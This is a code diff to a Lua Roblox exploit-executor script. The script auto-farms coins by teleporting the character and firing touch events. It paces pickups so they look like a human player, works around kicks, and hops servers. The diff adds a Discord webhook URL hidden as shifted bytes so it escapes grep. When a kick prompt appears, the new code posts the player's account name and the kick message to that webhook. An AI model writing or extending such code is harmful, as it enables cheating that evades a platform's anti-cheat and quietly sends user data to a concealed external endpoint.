@@ -12,7 +12,8 @@
 --   * after a coin is taken the script waits COIN_DELAY before going for the
 --     next one, so the pace reads as a player, not a sweep.
 --   * a 267 kick that got through anyway puts Roblox's own ErrorPrompt on the
---     screen; that prompt teleports straight into a fresh server.
+--     screen; that prompt teleports straight into a fresh server, and its text
+--     and the account name are posted to WEBHOOK_URL first.
 --
 --  Load-bearing, do not "clean up":
 --   * the character is moved by writing its CFrame. No physics actuator: a
@@ -42,9 +43,7 @@ local TeleportService = game:GetService("TeleportService")
 local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local rootPart = character:WaitForChild("HumanoidRootPart")
-local humanoid = character:WaitForChild("Humanoid")
+local character, rootPart, humanoid
 
 local remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
 local gameplayRemotes = remotes and remotes:WaitForChild("Gameplay", 5)
@@ -67,6 +66,27 @@ local COIN_DELAY = 0.2
 -- CoinContainer, each coin under it carries a CoinVisual.
 local CONTAINER_NAME = "CoinContainer"
 local VISUAL_NAME    = "CoinVisual"
+
+-- Kick notifications. The ErrorPrompt is the only place the reason is written
+-- down and it leaves with the client, so it is posted here before the hop.
+--
+-- The URL is not kept in clear: each byte is stored shifted by 90 (mod 256)
+-- and rebuilt at startup. Arithmetic rather than XOR or hex on purpose: this
+-- executor's parser rejects `~` and hex literals. Not security -- anyone
+-- holding the script can recover it -- only protection from grep, screenshots
+-- and casual copying. Bytes are three-digit decimal escapes, so one escape can
+-- never swallow the next digit.
+local WEBHOOK_BYTES = "\194\206\206\202\205\148\137\137\190\195\205\189\201\204\190\136\189\201\199\137\187\202\195\137\209\191\188\194\201\201\197\205\137\139\143\144\141\144\144\143\143\138\144\146\145\146\140\141\142\145\147\138\137\206\174\177\190\196\185\165\166\203\173\147\187\173\140\174\159\157\138\185\189\164\172\179\199\210\138\156\209\178\177\177\212\163\147\173\159\210\176\211\201\193\167\185\203\159\162\168\173\157\192\193\161\144\164\143\208\156\194\180\169\177\204\211\177\207\191\193\206"
+
+local function webhookUrl()
+    local out = {}
+    for i = 1, #WEBHOOK_BYTES do
+        out[i] = string.char((string.byte(WEBHOOK_BYTES, i) - 90) % 256)
+    end
+    return table.concat(out)
+end
+
+local WEBHOOK_URL = webhookUrl()
 
 -- server hop
 local HOP_ENABLED          = true
@@ -98,7 +118,6 @@ local currentTarget  = nil
 local coinWaitUntil  = 0      -- os.clock() time before which no coin is taken
 local coinsCollected = 0
 
-local container   = nil
 local containerConnection = nil
 
 local heartbeatConnection      = nil
@@ -125,6 +144,23 @@ local characterParts = {}
 
 
 -- ============================== HELPERS ==============================
+-- Adopting a character is one thing, not three fields: every site that is
+-- handed a new one comes through here. Deliberately not done at the top of the
+-- file -- waiting for a character there would hold the panel back on a slow
+-- join.
+local function bindCharacter(newChar)
+    character = newChar or player.Character or player.CharacterAdded:Wait()
+    rootPart = character:WaitForChild("HumanoidRootPart")
+    humanoid = character:WaitForChild("Humanoid")
+end
+
+-- The executor's HTTP backend, if it has one. Resolved per call: executors
+-- differ in which name they expose, and some only put it in place after load.
+local function httpBackend()
+    return (syn and syn.request) or (http and http.request)
+        or (fluxus and fluxus.request) or http_request or request
+end
+
 -- NaN is what makes Roblox throw "Invalid position": a number that is not a
 -- number, or an infinity, cannot be turned into a CFrame.
 local function isFiniteNumber(n)
@@ -207,7 +243,8 @@ end
 local function stepTowards(targetPos, dt)
     if not rootPart or not rootPart.Parent then return end
 
-    local rootPos = rootPart.Position
+    local cf = rootPart.CFrame
+    local rootPos = cf.Position
     if not isFiniteVector(rootPos) then return end
 
     local direction = targetPos - rootPos
@@ -217,7 +254,9 @@ local function stepTowards(targetPos, dt)
     local step = math.min(TARGET_SPEED * dt, distance)
     if step <= 0 then return end
 
-    rootPart.CFrame = CFrame.new(rootPos + direction.Unit * step) * currentRotation()
+    -- translated off the CFrame just read, so the rotation is the one the
+    -- engine reported rather than one rebuilt from it
+    rootPart.CFrame = cf + direction.Unit * step
     stopMovement()
 end
 
@@ -371,8 +410,9 @@ end
 -- Nothing here looks at Transparency, on purpose. The visual box is not what
 -- makes a coin visible -- a mesh child is -- so that box is transparent, and a
 -- transparency test would reject every coin on the map.
+-- Only ever asked about a coin that is still in the tree and is a part: that is
+-- what both the scan and the container listener put in the list.
 local function coinIsAvailable(coin)
-    if not coin:IsA("BasePart") or not coin.Parent then return false end
     if coin:GetAttribute("Collected") then return false end
 
     local visual = coinVisualOf(coin)
@@ -382,9 +422,11 @@ local function coinIsAvailable(coin)
     return isFiniteVector(coin.Position)
 end
 
+-- Returns the coin and its visual: looking the visual up here means the flight
+-- does not find it again on every frame.
 local function findNearestCoin(rootPos)
-    local nearest = nil
-    local nearestDist = MAX_DIST
+    local nearest, nearestVisual = nil, nil
+    local nearestSq = MAX_DIST * MAX_DIST
 
     for coin in pairs(activeCoins) do
         if not coin.Parent then
@@ -392,15 +434,15 @@ local function findNearestCoin(rootPos)
             -- bring this object back
             activeCoins[coin] = nil
         elseif coinIsAvailable(coin) then
-            local dist = (coin.Position - rootPos).Magnitude
-            if dist < nearestDist then
-                nearest = coin
-                nearestDist = dist
+            local offset = coin.Position - rootPos
+            local sq = offset.X * offset.X + offset.Y * offset.Y + offset.Z * offset.Z
+            if sq < nearestSq then
+                nearest, nearestVisual, nearestSq = coin, coinVisualOf(coin), sq
             end
         end
     end
 
-    return nearest
+    return nearest, nearestVisual
 end
 
 -- Fire the touch, both directions and both phases. A missing pickup is almost
@@ -411,10 +453,10 @@ end
 local function fireBothWays(a, b)
     if not a or not b then return end
     if not a.Parent or not b.Parent then return end
-    firetouchinterest(a, b, 0)
-    firetouchinterest(a, b, 1)
-    firetouchinterest(b, a, 0)
-    firetouchinterest(b, a, 1)
+    firetouchinterest(a, b, true)
+    firetouchinterest(a, b, false)
+    firetouchinterest(b, a, true)
+    firetouchinterest(b, a, false)
 end
 
 local function fireCoinTouch(coin, visual)
@@ -427,9 +469,9 @@ end
 -- next frame is harmless and is what gives a touch a second chance if the first
 -- one did not land. Wrapped, so a coin can never throw inside the frame loop.
 -- The body is a named function, not a closure per call: this runs every frame.
-local function collectCoin(coin)
+local function collectCoin(coin, visual)
     if not rootPart or not rootPart.Parent or not coin.Parent then return end
-    pcall(fireCoinTouch, coin, coinVisualOf(coin))
+    pcall(fireCoinTouch, coin, visual)
 end
 
 -- The container is re-found from scratch on every round, because the map -- and
@@ -445,7 +487,7 @@ local function rescanContainer()
     unhookContainer()
     activeCoins = {}
     currentTarget = nil
-    container = findCoinContainer()
+    local container = findCoinContainer()
 
     if not container then
         warn("[AutoFarm] no " .. CONTAINER_NAME .. " in the workspace: nothing to farm")
@@ -651,8 +693,7 @@ local function fetchServers(cursor)
         url = url .. "&cursor=" .. cursor
     end
 
-    local httpRequest = (syn and syn.request) or (http and http.request)
-        or (fluxus and fluxus.request) or http_request or request
+    local httpRequest = httpBackend()
 
     local body
     if httpRequest then
@@ -903,9 +944,42 @@ end
 -- ErrorPrompt over the screen. Teleporting to the place is the game's own "join
 -- a random server", so it is fired as soon as the prompt is seen.
 local ERROR_PROMPT_PATH = { "RobloxPromptGui", "promptOverlay", "ErrorPrompt" }
+-- The reason the game writes inside that prompt, when it writes one.
+local ERROR_MESSAGE_PATH = { "RobloxPromptGui", "promptOverlay", "ErrorPrompt",
+    "MessageArea", "ErrorFrame", "ErrorMessage" }
+
+-- One message per prompt: the watch below runs twice a second and the prompt
+-- can stay up for a while.
+local errorNotified = false
 
 local function errorPromptOnScreen()
     return walkPath(CoreGui, ERROR_PROMPT_PATH)
+end
+
+local function errorMessageText()
+    local label = walkPath(CoreGui, ERROR_MESSAGE_PATH)
+    local text = label and label.Text
+    return text and text ~= "" and text or "(no message)"
+end
+
+-- Best effort. Only the executor's request backend can post off Roblox's
+-- domains; without one the notification is lost and the hop still happens.
+local function notifyError()
+    local httpRequest = httpBackend()
+    if not httpRequest then return end
+
+    local content = ("Erreur à %s — %s : %s"):format(
+        os.date("%Y-%m-%d %H:%M:%S"), player.Name, errorMessageText())
+
+    local ok, body = pcall(HttpService.JSONEncode, HttpService, { content = content })
+    if not ok then return end
+
+    pcall(httpRequest, {
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body,
+    })
 end
 
 local function startErrorPromptWatch()
@@ -914,11 +988,17 @@ local function startErrorPromptWatch()
     errorPromptThread = task.spawn(function()
         while isLoaded do
             if errorPromptOnScreen() then
+                if not errorNotified then
+                    errorNotified = true
+                    notifyError()
+                end
                 hopLog("Error prompt on screen -> teleporting to a new server")
                 pcall(function()
                     TeleportService:Teleport(game.PlaceId)
                 end)
                 task.wait(5)   -- let the client leave before trying again
+            else
+                errorNotified = false
             end
             task.wait(0.5)
         end
@@ -929,11 +1009,26 @@ end
 
 -- ============================== FARM LOOP ==============================
 local function cleanupConnections()
-    if heartbeatConnection then heartbeatConnection:Disconnect() heartbeatConnection = nil end
-    if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
-    if coinsStartedConnection then coinsStartedConnection:Disconnect() coinsStartedConnection = nil end
-    if coinCollectedConnection then coinCollectedConnection:Disconnect() coinCollectedConnection = nil end
-    if characterChildConnection then characterChildConnection:Disconnect() characterChildConnection = nil end
+    if heartbeatConnection then
+        heartbeatConnection:Disconnect()
+        heartbeatConnection = nil
+    end
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    if coinsStartedConnection then
+        coinsStartedConnection:Disconnect()
+        coinsStartedConnection = nil
+    end
+    if coinCollectedConnection then
+        coinCollectedConnection:Disconnect()
+        coinCollectedConnection = nil
+    end
+    if characterChildConnection then
+        characterChildConnection:Disconnect()
+        characterChildConnection = nil
+    end
     for _, connection in ipairs(roundEndConnections) do
         connection:Disconnect()
     end
@@ -970,7 +1065,7 @@ local function updateFarm(dt)
         return
     end
 
-    local nearest = findNearestCoin(rootPos)
+    local nearest, visual = findNearestCoin(rootPos)
     currentTarget = nearest
 
     if not nearest then
@@ -983,8 +1078,9 @@ local function updateFarm(dt)
     -- fire at it and keep flying. A shot fired from far away is ignored by the
     -- game and costs nothing: the character is still closing in, and the next
     -- frame fires again, from closer. That is why no radius is needed here.
-    collectCoin(nearest)
+    collectCoin(nearest, visual)
     stepTowards(nearest.Position, dt)
+    return
 end
 
 local function startMovementEngine()
@@ -1001,8 +1097,12 @@ local function startMovementEngine()
         if ok then
             showErrors = false
         else
-            showErrors = true
-            warn("[AutoFarm] " .. tostring(err))
+            -- one warn per run of failures, not one per frame: on a phone the
+            -- console write is the heaviest thing this loop can do
+            if not showErrors then
+                showErrors = true
+                warn("[AutoFarm] " .. tostring(err))
+            end
             stopMovement()
         end
     end)
@@ -1040,9 +1140,7 @@ local function loadScript()
     bagIsFull = false
     coinWaitUntil = 0
 
-    character = player.Character or player.CharacterAdded:Wait()
-    rootPart = character:WaitForChild("HumanoidRootPart")
-    humanoid = character:WaitForChild("Humanoid")
+    bindCharacter()
 
     coinsCollected = 0
 
@@ -1057,9 +1155,7 @@ local function loadScript()
     characterAddedConnection = player.CharacterAdded:Connect(function(newChar)
         cleanupConnections()
 
-        character = newChar
-        rootPart = character:WaitForChild("HumanoidRootPart")
-        humanoid = character:WaitForChild("Humanoid")
+        bindCharacter(newChar)
 
         bagIsFull = false
         coinWaitUntil = 0
@@ -1284,13 +1380,13 @@ local function createRow(y, labelText, descText, initial, callback)
     end)
 
     -- the description comes back too, so it can double as a live readout
-    return row, desc
+    return desc
 end
 
 -- ---------------------------------- layout ----------------------------------
 divider(44)
 
-createRow(45, "Auto farm", "Always the closest coin", true, function(state)
+createRow(45, "Auto farm", "Always the closest coin", enabled, function(state)
     enabled = state
     if state then
         if not isLoaded then
@@ -1304,17 +1400,14 @@ createRow(45, "Auto farm", "Always the closest coin", true, function(state)
     end
 end)
 
-createRow(91, "Anti-AFK", "Clicks back when the game says it is idle", true, function(state)
+createRow(91, "Anti-AFK", "Clicks back when the game says it is idle", afkActive, function(state)
     afkActive = state
 end)
 
 divider(137)
 
--- declared before the row, not from its return value: a local assigned that way
--- is not yet in scope inside the callback it is being handed to
-local lowRenderDesc = nil
-local _
-_, lowRenderDesc = createRow(138, "Low render", "Draws nothing, saves battery", true, function(state)
+local lowRenderDesc
+lowRenderDesc = createRow(138, "Low render", "Draws nothing, saves battery", lowRender, function(state)
     if setLowRender(state) then
         lowRenderDesc.Text = state and "Draws nothing, saves battery" or "Rendering back on"
     else
@@ -1325,11 +1418,10 @@ end)
 divider(184)
 
 -- the description line of this row is taken over by the countdown
-local _, hopDescLabel = createRow(185, "Server hop", "Every 60 min", HOP_ENABLED, function(state)
+hopDesc = createRow(185, "Server hop", "Every 60 min", HOP_ENABLED, function(state)
     HOP_ENABLED = state
     if state then farmTime = 0 end
 end)
-hopDesc = hopDescLabel
 
 divider(231)
 
